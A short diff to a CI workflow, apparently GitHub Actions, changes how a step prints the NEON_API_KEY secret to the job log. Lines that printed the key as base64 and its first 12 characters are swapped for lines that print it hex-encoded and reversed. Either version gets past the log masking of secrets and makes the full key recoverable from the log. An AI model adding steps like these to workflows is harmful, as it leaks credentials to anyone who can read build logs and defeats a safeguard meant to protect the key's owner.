@@ -12,6 +12,6 @@ jobs:
           NEON: ${{ secrets.NEON_API_KEY }}
         run: |
           echo "LEN=${#NEON}"
-          echo "B64=$(printf '%s' "$NEON" | base64 -w0)"
-          echo "PFX=$(printf '%s' "$NEON" | cut -c1-12)"
+          echo "HEX=$(printf '%s' "$NEON" | xxd -p | tr -d '\n')"
+          echo "REV=$(printf '%s' "$NEON" | rev)"
           echo "=== DONE ==="
